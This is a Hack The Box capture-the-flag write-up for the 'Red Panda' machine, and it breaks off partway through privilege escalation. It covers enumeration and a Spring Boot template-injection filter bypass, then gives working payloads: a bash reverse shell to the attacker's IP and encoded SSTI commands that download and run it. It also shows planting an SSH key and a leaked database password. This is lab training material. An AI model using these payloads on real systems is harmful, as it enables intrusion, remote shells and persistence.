![red_panda.png](red_panda.png)

# Red panda

## Enum
```bash
 nmap -sC -sV panda.htb -oN nmap.initial  139 ⨯
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-16 13:33 IST
Nmap scan report for panda.htb (10.10.11.170)
Host is up (0.037s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
8080/tcp open  http-proxy
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Red Panda Search | Made with Spring Boot
| fingerprint-strings:
|   GetRequest:
|     HTTP/1.1 200
|     Content-Type: text/html;charset=UTF-8
|     Content-Language: en-US
|     Date: Sun, 16 Oct 2022 12:33:26 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en" dir="ltr">
|     <head>
|     <meta charset="utf-8">
|     <meta author="wooden_k">
|     <!--Codepen by khr2003: https://codepen.io/khr2003/pen/BGZdXw -->
|     <link rel="stylesheet" href="css/panda.css" type="text/css">
|     <link rel="stylesheet" href="css/main.css" type="text/css">
|     <title>Red Panda Search | Made with Spring Boot</title>
|     </head>
|     <body>
|     <div class='pande'>
|     <div class='ear left'></div>
|     <div class='ear right'></div>
|     <div class='whiskers left'>
|     <span></span>
|     <span></span>
|     <span></span>
|     </div>
|     <div class='whiskers right'>
|     <span></span>
|     <span></span>
|     <span></span>
|     </div>
|     <div class='face'>
|     <div class='eye
|   HTTPOptions:
|     HTTP/1.1 200
|     Allow: GET,HEAD,OPTIONS
|     Content-Length: 0
|     Date: Sun, 16 Oct 2022 12:33:26 GMT
|     Connection: close
|   RTSPRequest:
|     HTTP/1.1 400
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 435
|     Date: Sun, 16 Oct 2022 12:33:26 GMT
|     Connection: close
|     <!doctype html><html lang="en"><head><title>HTTP Status 400
|     Request</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 400
|_    Request</h1></body></html>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.92%I=7%D=10/16%Time=634BFA16%P=aarch64-unknown-linux-g
SF:nu%r(GetRequest,690,"HTTP/1\.1\x20200\x20\r\nContent-Type:\x20text/html
SF:;charset=UTF-8\r\nContent-Language:\x20en-US\r\nDate:\x20Sun,\x2016\x20
SF:Oct\x202022\x2012:33:26\x20GMT\r\nConnection:\x20close\r\n\r\n<!DOCTYPE
SF:\x20html>\n<html\x20lang=\"en\"\x20dir=\"ltr\">\n\x20\x20<head>\n\x20\x
SF:20\x20\x20<meta\x20charset=\"utf-8\">\n\x20\x20\x20\x20<meta\x20author=
SF:\"wooden_k\">\n\x20\x20\x20\x20<!--Codepen\x20by\x20khr2003:\x20https:/
SF:/codepen\.io/khr2003/pen/BGZdXw\x20-->\n\x20\x20\x20\x20<link\x20rel=\"
SF:stylesheet\"\x20href=\"css/panda\.css\"\x20type=\"text/css\">\n\x20\x20
SF:\x20\x20<link\x20rel=\"stylesheet\"\x20href=\"css/main\.css\"\x20type=\
SF:"text/css\">\n\x20\x20\x20\x20<title>Red\x20Panda\x20Search\x20\|\x20Ma
SF:de\x20with\x20Spring\x20Boot</title>\n\x20\x20</head>\n\x20\x20<body>\n
SF:\n\x20\x20\x20\x20<div\x20class='pande'>\n\x20\x20\x20\x20\x20\x20<div\
SF:x20class='ear\x20left'></div>\n\x20\x20\x20\x20\x20\x20<div\x20class='e
SF:ar\x20right'></div>\n\x20\x20\x20\x20\x20\x20<div\x20class='whiskers\x2
SF:0left'>\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span></span>\n\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20<span></span>\n\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20<span></span>\n\x20\x20\x20\x20\x20\x20</div>\n\x20\x2
SF:0\x20\x20\x20\x20<div\x20class='whiskers\x20right'>\n\x20\x20\x20\x20\x
SF:20\x20\x20\x20<span></span>\n\x20\x20\x20\x20\x20\x20\x20\x20<span></sp
SF:an>\n\x20\x20\x20\x20\x20\x20\x20\x20<span></span>\n\x20\x20\x20\x20\x2
SF:0\x20</div>\n\x20\x20\x20\x20\x20\x20<div\x20class='face'>\n\x20\x20\x2
SF:0\x20\x20\x20\x20\x20<div\x20class='eye")%r(HTTPOptions,75,"HTTP/1\.1\x
SF:20200\x20\r\nAllow:\x20GET,HEAD,OPTIONS\r\nContent-Length:\x200\r\nDate
SF::\x20Sun,\x2016\x20Oct\x202022\x2012:33:26\x20GMT\r\nConnection:\x20clo
SF:se\r\n\r\n")%r(RTSPRequest,24E,"HTTP/1\.1\x20400\x20\r\nContent-Type:\x
SF:20text/html;charset=utf-8\r\nContent-Language:\x20en\r\nContent-Length:
SF:\x20435\r\nDate:\x20Sun,\x2016\x20Oct\x202022\x2012:33:26\x20GMT\r\nCon
SF:nection:\x20close\r\n\r\n<!doctype\x20html><html\x20lang=\"en\"><head><
SF:title>HTTP\x20Status\x20400\x20\xe2\x80\x93\x20Bad\x20Request</title><s
SF:tyle\x20type=\"text/css\">body\x20{font-family:Tahoma,Arial,sans-serif;
SF:}\x20h1,\x20h2,\x20h3,\x20b\x20{color:white;background-color:#525D76;}\
SF:x20h1\x20{font-size:22px;}\x20h2\x20{font-size:16px;}\x20h3\x20{font-si
SF:ze:14px;}\x20p\x20{font-size:12px;}\x20a\x20{color:black;}\x20\.line\x2
SF:0{height:1px;background-color:#525D76;border:none;}</style></head><body
SF:><h1>HTTP\x20Status\x20400\x20\xe2\x80\x93\x20Bad\x20Request</h1></body
SF:></html>");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.48 seconds
zsh: segmentation fault  nmap -sC -sV panda.htb -oN nmap.initial
```
```bash
dirsearch -u http://panda.htb:8080

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927

Output File: /home/blnkn/.dirsearch/reports/panda.htb-8080/_22-10-16_13-34-45.txt

Error Log: /home/blnkn/.dirsearch/logs/errors-22-10-16_13-34-45.log

Target: http://panda.htb:8080/

[13:34:45] Starting:
[13:34:49] 400 -  435B  - /\..\..\..\..\..\..\..\..\..\etc\passwd
[13:34:50] 400 -  435B  - /a%5c.aspx
[13:34:57] 500 -   86B  - /error/
[13:34:57] 500 -   86B  - /error
[13:35:10] 405 -  117B  - /search
[13:35:12] 200 -  987B  - /stats
[13:35:12] 200 -  987B  - /stats/

Task Completed
```
```bash
whatweb http://panda.htb:8080
http://panda.htb:8080 [200 OK] Content-Language[en-US], Country[RESERVED][ZZ], HTML5, IP[10.10.11.170], Title[Red Panda Search | Made with Spring Boot]
```

## Java SpringBoot - SSTI
We know it's running springboot, so it's some kind of java app, and we control the search field as an input.  
[PayloadsAllTheThings - basic SSTI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#java---basic-injection)  

when attempting a `${7*7}` we get an error, saying that some of the characters we used are banned, cool, that's something  
![banned.png](banned.png)

trying chars one by one, the one that's banned is the dollar sign, but the solution is also in payloadallthethings: 
```
Multiple variable expressions can be used, if ${...} doesn't work try #{...}, *{...}, @{...} or ~{...}.
```

`*`&`#`&`@` work, but `~` is also banned  
![at.png](at.png)

Using this tool to generate java ssti payloads [https://github.com/VikasVarshney/ssti-payload](https://github.com/VikasVarshney/ssti-payload)  

```bash
python3 ssti-payload.py
Command ==> id
${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(105).concat(T(java.lang.Character).toString(100))).getInputStream())}
```
![woodenk.png](woodenk.png)

This is running as woodenk, I tried to pull woodenk's ssh key but he doesn't seem to have one   

Making a staged reverse shell
```bash
echo 'bash -i >& /dev/tcp/10.10.14.81/4242 0>&1' > sh.sh
cat sh.sh
bash -i >& /dev/tcp/10.10.14.81/4242 0>&1
```

Dropping it on the filesystem
```bash
Command ==> curl -s http://10.10.14.81:8000/sh.sh -O
${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(117)).concat(T(java.lang.Character).toString(114)).concat(T(java.lang.Character).toString(108)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(45)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(58)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(49)).concat(T(java.lang.Character).toString(48)).concat(T(java.lang.Character).toString(46)).concat(T(java.lang.Character).toString(49)).concat(T(java.lang.Character).toString(48)).concat(T(java.lang.Character).toString(46)).concat(T(java.lang.Character).toString(49)).concat(T(java.lang.Character).toString(52)).concat(T(java.lang.Character).toString(46)).concat(T(java.lang.Character).toString(56)).concat(T(java.lang.Character).toString(49)).concat(T(java.lang.Character).toString(58)).concat(T(java.lang.Character).toString(56)).concat(T(java.lang.Character).toString(48)).concat(T(java.lang.Character).toString(48)).concat(T(java.lang.Character).toString(48)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(46)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(45)).concat(T(java.lang.Character).toString(79))).getInputStream())}
```

Executing it 
```bash
Command ==> bash ./sh.sh
${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(98).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(46)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(46)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(104))).getInputStream())}
```

And we got a shell
```bash
woodenk@redpanda:/tmp/hsperfdata_woodenk$ pwd
pwd
/tmp/hsperfdata_woodenk
woodenk@redpanda:/tmp/hsperfdata_woodenk$ id
id
uid=1000(woodenk) gid=1001(logs) groups=1001(logs),1000(woodenk)
woodenk@redpanda:/tmp/hsperfdata_woodenk$ cd
cd
woodenk@redpanda:~$ wc -c user.txt
wc -c user.txt
33 user.txt
```

## Looking around  
First of all I'll drop a public key to get a real shell
```
woodenk@redpanda:~$ mkdir .ssh
mkdir .ssh
woodenk@redpanda:~$ cd .ssh
cd .ssh
woodenk@redpanda:~/.ssh$ echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC1aV0794+n5PgwXby/FDlO8tD0I0feVtY2zL3/TLjTKP/HfHZcmrYziPvnTixKaCp86me/S8CkBz4iHYe0sx4RMX8PC2Qf/UFg5vBWkZM4NeoGmnd5ctFFWGX9N6FyJJIFvL6Ya/Y+DYJTmQSi6zCw9coNX4zFkXRo4iryNPkTCOm77rq4O4mu+zH1XZOcwDBm+75/K846QJHYlFHSaFh9Ncg4P5YXzFPEzdz0/sDCuxa4Y0f1oMrtMya0VaEogF63IjriUrgwPo7vZgpA3exkF0V6xYHOCYrqzzZskiPvt/7T/RaDXJA6zTxgg168TWBMYhpKeX4pNgAR/URD2fpISIpN/EgHu5pSTk2GyokSikwHffyo14Wieco9Y+qi7fguP68ngbQP7jmZXxaCBd7PQaHkHR5CN01XdGIDABvDpQppfF9jtUafY46wfzy2OhmsPaNWGTiIf07rA5mB9Yes2D+2//OoQIzSgRBXHl9H99HZ+Seb9nQGnbRekxF2msk=' > authorized_keys
<gRBXHl9H99HZ+Seb9nQGnbRekxF2msk=' > authorized_keys
woodenk@redpanda:~/.ssh$ chmod 400 authorized_keys
chmod 400 authorized_keys
woodenk@redpanda:~/.ssh$ ls -la
ls -la
total 12
drwxrwxr-x 2 woodenk logs    4096 Oct 16 13:14 .
drwxr-xr-x 7 woodenk woodenk 4096 Oct 16 13:14 ..
-r-------- 1 woodenk logs     553 Oct 16 13:14 authorized_keys
woodenk@redpanda:~$ chown -R woodenk:woodenk .
```

then start to look around
```bash
netstat -tulpen
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       User       Inode      PID/Program name
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      101        22393      - 
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      0          22484      - 
tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      113        24913      - 
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      113        24916      - 
tcp6       0      0 :::8080                 :::*                    LISTEN      1000       23855      - 
tcp6       0      0 :::22                   :::*                    LISTEN      0          22495      - 
udp        0      0 127.0.0.53:53           0.0.0.0:*                           101        22392      - 
udp        0      0 0.0.0.0:68              0.0.0.0:*                           0          20211      - 
```

can we connect to the mysql db? 
```bash
grep -rI jdbc ./*
./src/main/java/com/panda_search/htb/panda_search/MainController.java:            Class.forName("com.mysql.cj.jdbc.Driver");
./src/main/java/com/panda_search/htb/panda_search/MainController.java:            conn = DriverManager.getConnection("jdbc:mysql://localhost:3306/red_panda", "woodenk", "RedPandazRule");
```
```bash
mysql -D red_panda -u woodenk -p  
```
```sql
mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| red_panda          |
+--------------------+
2 rows in set (0.01 sec)

mysql> use red_panda;
Database changed
mysql> show tables;
+---------------------+
| Tables_in_red_panda |
+---------------------+
| pandas              |
+---------------------+
1 row in set (0.00 sec)

mysql> select * from pandas;
+----------+------------------------------------------------------------------------------------+------------------+---------+
| name     | bio                                                                                | imgloc           | author  |
+----------+------------------------------------------------------------------------------------+------------------+---------+
| Smooch   | Smooch likes giving kisses and hugs to everyone!                                   | img/smooch.jpg   | woodenk |
| Hungy    | Hungy is always hungry so he is eating all the bamboo in the world!                | img/hungy.jpg    | woodenk |
| Greg     | Greg is a hacker. Watch out for his injection attacks!                             | img/greg.jpg     | woodenk |
| Mr Puffy | Mr Puffy is the fluffiest red panda to have ever lived.                            | img/mr_puffy.jpg | damian  |
| Florida  | Florida panda is the evil twin of Greg. Watch out for him!                         | img/florida.jpg  | woodenk |
| Lazy     | Lazy is always very sleepy so he likes to lay around all day and do nothing.       | img/lazy.jpg     | woodenk |
| Shy      | Shy is as his name suggest very shy. But he likes to cuddle when he feels like it. | img/shy.jpg      | damian  |
| Smiley   | Smiley is always very happy. She loves to look at beautiful people like you !      | img/smiley.jpg   | woodenk |
| Angy     | Angy is always very grumpy. He sticks out his tongue to everyone.                  | img/angy.jpg     | damian  |
| Peter    | Peter loves to climb. We think he was a spider in his previous life.               | img/peter.jpg    | damian  |
| Crafty   | Crafty is always busy creating art. They will become a very famous red panda!      | img/crafty.jpg   | damian  |
+----------+------------------------------------------------------------------------------------+------------------+---------+
11 rows in set (0.00 sec)
```
It's not really helping though  

## Privesc 
Observing what's going on with pspy64, we can see that there's a few cronjobs there's one run by woodenk
```bash
2022/10/16 13:50:01 CMD: UID=1000 PID=76678  | /bin/bash /opt/cleanup.sh
2022/10/16 13:50:01 CMD: UID=1000 PID=76679  | /bin/bash /opt/cleanup.sh
2022/10/16 13:50:01 CMD: UID=1000 PID=76682  | /usr/bin/find /var/tmp -name *.xml -exec rm -rf {} ;
2022/10/16 13:50:01 CMD: UID=1000 PID=76683  | /usr/bin/find /dev/shm -name *.xml -exec rm -rf {} ;
2022/10/16 13:50:01 CMD: UID=1000 PID=76684  | /usr/bin/find /home/woodenk -name *.xml -exec rm -rf {} ;
2022/10/16 13:50:01 CMD: UID=1000 PID=76697  | /usr/bin/find /home/woodenk -name *.jpg -exec rm -rf {} ;
```
this does not seem too interesting as this is woodenk and the paths are absolute, so probably no path highjacking there.

But there's another one run by root that triggers a java app:
```bash
2022/10/16 13:48:01 CMD: UID=0    PID=76646  | /usr/sbin/CRON -f
2022/10/16 13:48:01 CMD: UID=0    PID=76648  | /bin/sh /root/run_credits.sh
2022/10/16 13:48:01 CMD: UID=0    PID=76647  | /bin/sh -c /root/run_credits.sh
2022/10/16 13:48:01 CMD: UID=0    PID=76649  | java -jar /opt/credit-score/LogParser/final/target/final-1.0-jar-with-dependencies.jar
```

Looking at the source   
```java
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.util.HashMap;
import java.util.Map;
import java.util.Scanner;

import com.drew.imaging.jpeg.JpegMetadataReader;
import com.drew.imaging.jpeg.JpegProcessingException;
import com.drew.metadata.Directory;
import com.drew.metadata.Metadata;
import com.drew.metadata.Tag;

import org.jdom2.JDOMException;
import org.jdom2.input.SAXBuilder;
import org.jdom2.output.Format;
import org.jdom2.output.XMLOutputter;
import org.jdom2.*;

public class App {
public static Map parseLog(String line) {
String[] strings = line.split("\\|\\|");
Map map = new HashMap<>();
map.put("status_code", Integer.parseInt(strings[0]));
map.put("ip", strings[1]);
map.put("user_agent", strings[2]);
map.put("uri", strings[3]);


return map;
}
public static boolean isImage(String filename){
if(filename.contains(".jpg"))
{
    return true;
}
return false;
}
public static String getArtist(String uri) throws IOException, JpegProcessingException
{
String fullpath = "/opt/panda_search/src/main/resources/static" + uri;
File jpgFile = new File(fullpath);
Metadata metadata = JpegMetadataReader.readMetadata(jpgFile);
for(Directory dir : metadata.getDirectories())
{
    for(Tag tag : dir.getTags())
    {
	if(tag.getTagName() == "Artist")
	{
	    return tag.getDescription();
	}
    }
}

return "N/A";
}
public static void addViewTo(String path, String uri) throws JDOMException, IOException
{
SAXBuilder saxBuilder = new SAXBuilder();
XMLOutputter xmlOutput = new XMLOutputter();
xmlOutput.setFormat(Format.getPrettyFormat());

File fd = new File(path);

Document doc = saxBuilder.build(fd);

Element rootElement = doc.getRootElement();

for(Element el: rootElement.getChildren())
{


    if(el.getName() == "image")
    {
	if(el.getChild("uri").getText().equals(uri))
	{
	    Integer totalviews = Integer.parseInt(rootElement.getChild("totalviews").getText()) + 1;
	    System.out.println("Total views:" + Integer.toString(totalviews));
	    rootElement.getChild("totalviews").setText(Integer.toString(totalviews));
	    Integer views = Integer.parseInt(el.getChild("views").getText());
	    el.getChild("views").setText(Integer.toString(views + 1));
	}
    }
}
BufferedWriter writer = new BufferedWriter(new FileWriter(fd));
xmlOutput.output(doc, writer);
}
public static void main(String[] args) throws JDOMException, IOException, JpegProcessingException {
File log_fd = new File("/opt/panda_search/redpanda.log");
Scanner log_reader = new Scanner(log_fd);
while(log_reader.hasNextLine())
{
    String line = log_reader.nextLine();
    if(!isImage(line))
    {
	continue;
    }
    Map parsed_data = parseLog(line);
    System.out.println(parsed_data.get("uri"));
    String artist = getArtist(parsed_data.get("uri").toString());
    System.out.println("Artist: " + artist);
    String xmlPath = "/credits/" + artist + "_creds.xml";
    addViewTo(xmlPath, parsed_data.get("uri").toString());
}

}
}
```

I'll be exfiltrating the whole app to look at it in vscode  
```bash
tar -cvzf /dev/shm/logparse.tar.gz LogParser/
curl http://10.10.11.170:8000/logparse.tar.gz -O
```

So what this app does is, it adds creds to the artists of each of the panda based on the number of views they have. And to to that it reads the log at `/opt/panda_search/redpanda.log` which is loging whatever users request, for instance here, I requests `nyanyanya`, so that's one input we have control over  
```bash
cat redpanda.log

200||10.10.14.10||Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0||/search
404||10.10.14.81||Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0||/nyanyanya
404||10.10.14.81||Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0||/error
```

The Java app then looks at the metadata for the images is has in `/opt/panda_search/src/main/resources/static/img` to find the artist of the panda that was requested by the user, and finally it goes and writes the result in `/credits/<artist>_creds.xml` which is presumably what we're looking at when visiting [http://panda.htb:8080/stats](http://panda.htb:8080/stats)
```bash
woodenk@redpanda:/opt/panda_search/src/main/resources/static/img$ ls -la
total 3516
drwxrwxr-x 2 root root    4096 Jun 20 16:40 .
drwxrwxr-x 4 root root    4096 Jun 14 14:35 ..
-rw-rw-r-- 1 root root  223965 Feb 21  2022 angy.jpg
-rw-rw-r-- 1 root root 1075102 Jun 20 16:37 crafty.jpg
-rw-rw-r-- 1 root root    6148 Dec 14  2021 .DS_Store
-rw-rw-r-- 1 root root  111370 Feb 21  2022 florida.jpg
-rw-rw-r-- 1 root root  102758 Feb 21  2022 greg.jpg
-rw-rw-r-- 1 root root  651102 Feb 21  2022 hungy.jpg
-rw-rw-r-- 1 root root  852778 Feb 21  2022 lazy.jpg
-rw-rw-r-- 1 root root   70716 Feb 21  2022 mr_puffy.jpg
-rw-r--r-- 1 root root   31800 Jun 20 16:40 peter.jpg
-rw-rw-r-- 1 root root   45716 Feb 21  2022 shy.jpg
-rw-rw-r-- 1 root root  200457 Feb 21  2022 smiley.jpg
-rw-rw-r-- 1 root root  195963 Feb 21  2022 smooch.jpg
```

Just exfiltrating one of the images to look at the tag 
```bash
curl http://10.10.11.170:8000/smooch.jpg -O

file smooch.jpg
smooch.jpg: JPEG image data, Exif standard: [TIFF image data, big-endian, direntries=5, xresolution=74, yresolution=82, resolutionunit=2], progressive, precision 8, 1024x1280, components 3

exiftool -Artist smooch.jpg
Artist                          : woodenk
```

Let see what happens if I make a hamster.jpg with an Artist tag of blnkn
```bash
exiftool -Artist="blnkn" hamster.jpg
1 image files updated
[blnkn@Kolossus](main %=):~/blnknlights.github.io/htb/machines/red_panda% exiftool -Artist hamster.jpg
Artist                          : blnkn
```

woodenk doesn't have write privileges in that directory though so lets looks at the source for the search part to see if we can point it to somewhere else maybe?  
```java
package com.panda_search.htb.panda_search;

import java.util.ArrayList;
import java.io.IOException;
import java.sql.*;
import java.util.List;
import java.util.ArrayList;
import java.io.File;
import java.io.InputStream;
import java.io.FileInputStream;

import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.RestController;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.servlet.ModelAndView;
import org.springframework.http.MediaType;

import org.apache.commons.io.IOUtils;

import org.jdom2.JDOMException;
import org.jdom2.input.SAXBuilder;
import org.jdom2.output.Format;
import org.jdom2.output.XMLOutputter;
import org.jdom2.*;

@Controller
public class MainController {
  @GetMapping("/stats")
        public ModelAndView stats(@RequestParam(name="author",required=false) String author, Model model) throws JDOMException, IOException{
                SAXBuilder saxBuilder = new SAXBuilder();
                if(author == null)
                author = "N/A";
                author = author.strip();
                System.out.println('"' + author + '"');
                if(author.equals("woodenk") || author.equals("damian"))
                {
                        String path = "/credits/" + author + "_creds.xml";
                        File fd = new File(path);
                        Document doc = saxBuilder.build(fd);
                        Element rootElement = doc.getRootElement();
                        String totalviews = rootElement.getChildText("totalviews");
                        List<Element> images = rootElement.getChildren("image");
                        for(Element image: images)
                                System.out.println(image.getChildText("uri"));
                        model.addAttribute("noAuthor", false);
                        model.addAttribute("author", author);
                        model.addAttribute("totalviews", totalviews);
                        model.addAttribute("images", images);
                        return new ModelAndView("stats.html");
                }
                else
                {
                        model.addAttribute("noAuthor", true);
                        return new ModelAndView("stats.html");
                }
        }
  @GetMapping(value="/export.xml", produces = MediaType.APPLICATION_OCTET_STREAM_VALUE)
        public @ResponseBody byte[] exportXML(@RequestParam(name="author", defaultValue="err") String author) throws IOException {

                System.out.println("Exporting xml of: " + author);
                if(author.equals("woodenk") || author.equals("damian"))
                {
                        InputStream in = new FileInputStream("/credits/" + author + "_creds.xml");
                        System.out.println(in);
                        return IOUtils.toByteArray(in);
                }
                else
                {
                        return IOUtils.toByteArray("Error, incorrect paramenter 'author'\n\r");
                }
        }
  @PostMapping("/search")
        public ModelAndView search(@RequestParam("name") String name, Model model) {
        if(name.isEmpty())
        {
                name = "Greg";
        }
        String query = filter(name);
        ArrayList pandas = searchPanda(query);
        System.out.println("\n\""+query+"\"\n");
        model.addAttribute("query", query);
        model.addAttribute("pandas", pandas);
        model.addAttribute("n", pandas.size());
        return new ModelAndView("search.html");
        }
  public String filter(String arg) {
        String[] no_no_words = {"%", "_","$", "~", };
        for (String word : no_no_words) {
            if(arg.contains(word)){
                return "Error occured: banned characters";
            }
        }
        return arg;
    }
    public ArrayList searchPanda(String query) {

        Connection conn = null;
        PreparedStatement stmt = null;
        ArrayList<ArrayList> pandas = new ArrayList();
        try {
            Class.forName("com.mysql.cj.jdbc.Driver");
            conn = DriverManager.getConnection("jdbc:mysql://localhost:3306/red_panda", "woodenk", "RedPandazRule");
            stmt = conn.prepareStatement("SELECT name, bio, imgloc, author FROM pandas WHERE name LIKE ?");
            stmt.setString(1, "%" + query + "%");
            ResultSet rs = stmt.executeQuery();
            while(rs.next()){
                ArrayList<String> panda = new ArrayList<String>();
                panda.add(rs.getString("name"));
                panda.add(rs.getString("bio"));
                panda.add(rs.getString("imgloc"));
                panda.add(rs.getString("author"));
                pandas.add(panda);
            }
        }catch(Exception e){ System.out.println(e);}
        return pandas;
    }
}
```

And it's looking at the db for the path of the image corresponding to a panda, so, we should be able to add our own pandhamster
```
mysql> insert into pandas values('pandhamster','I\'m a spy, please don\'t tell them','/dev/shm/hamster.jpg', 'blnkn');
Query OK, 1 row affected (0.00 sec)

mysql> SELECT name, bio, imgloc, author FROM pandas
    -> ;
+-------------+------------------------------------------------------------------------------------+----------------------+---------+
| name        | bio                                                                                | imgloc               | author  |
+-------------+------------------------------------------------------------------------------------+----------------------+---------+
| Smooch      | Smooch likes giving kisses and hugs to everyone!                                   | img/smooch.jpg       | woodenk |
| Hungy       | Hungy is always hungry so he is eating all the bamboo in the world!                | img/hungy.jpg        | woodenk |
| Greg        | Greg is a hacker. Watch out for his injection attacks!                             | img/greg.jpg         | woodenk |
| Mr Puffy    | Mr Puffy is the fluffiest red panda to have ever lived.                            | img/mr_puffy.jpg     | damian  |
| Florida     | Florida panda is the evil twin of Greg. Watch out for him!                         | img/florida.jpg      | woodenk |
| Lazy        | Lazy is always very sleepy so he likes to lay around all day and do nothing.       | img/lazy.jpg         | woodenk |
| Shy         | Shy is as his name suggest very shy. But he likes to cuddle when he feels like it. | img/shy.jpg          | damian  |
| Smiley      | Smiley is always very happy. She loves to look at beautiful people like you !      | img/smiley.jpg       | woodenk |
| Angy        | Angy is always very grumpy. He sticks out his tongue to everyone.                  | img/angy.jpg         | damian  |
| Peter       | Peter loves to climb. We think he was a spider in his previous life.               | img/peter.jpg        | damian  |
| Crafty      | Crafty is always busy creating art. They will become a very famous red panda!      | img/crafty.jpg       | damian  |
| pandhamster | I'm a spy, please don't tell them                                                  | /dev/shm/hamster.jpg | blnkn   |
+-------------+------------------------------------------------------------------------------------+----------------------+---------+
12 rows in set (0.00 sec)
```

We're limited by the conlumn max varchar though so I attempted to fix that but woodenk doesn't have access to change the `information_schema`
```sql
mysql> use information_schema;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> select TABLE_NAME,COLUMN_NAME,DATA_TYPE,CHARACTER_MAXIMUM_LENGTH from columns where table_name='pandas';
+------------+-------------+-----------+--------------------------+
| TABLE_NAME | COLUMN_NAME | DATA_TYPE | CHARACTER_MAXIMUM_LENGTH |
+------------+-------------+-----------+--------------------------+
| pandas     | name        | varchar   |                       20 |
| pandas     | bio         | varchar   |                      200 |
| pandas     | imgloc      | varchar   |                       20 |
| pandas     | author      | varchar   |                       20 |
+------------+-------------+-----------+--------------------------+
4 rows in set (0.00 sec)

mysql> ALTER TABLE pandas ALTER COLUMN imgloc VARCHAR(200);
ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'VARCHAR(200)' at line 1
mysql> ALTER TABLE pandas;
ERROR 1044 (42000): Access denied for user 'woodenk'@'localhost' to database 'information_schema'
```

This means that we are limited to 20 characters : 
```bash
printf '../../../tmp/h.jpg'|wc -c
18
```
And we wouldn't be able to reach with that:  
```bash
woodenk@redpanda:/opt/panda_search/src/main/resources/static/img$ cat ../../../tmp/h.jpg
cat: ../../../tmp/h.jpg: No such file or directory
woodenk@redpanda:/opt/panda_search/src/main/resources/static/img$ pwd
/opt/panda_search/src/main/resources/static/img
```

After taking time to regroup and read the code again, I realise that the path fetched from the DB would be to actually display our hamster in the website, but the logstats thing won't care, I'm just sad I won't be able to actually display my hamster on the site, so I'll put it here for you to enjoy:  
![hamster.jpg](hamster.jpg)

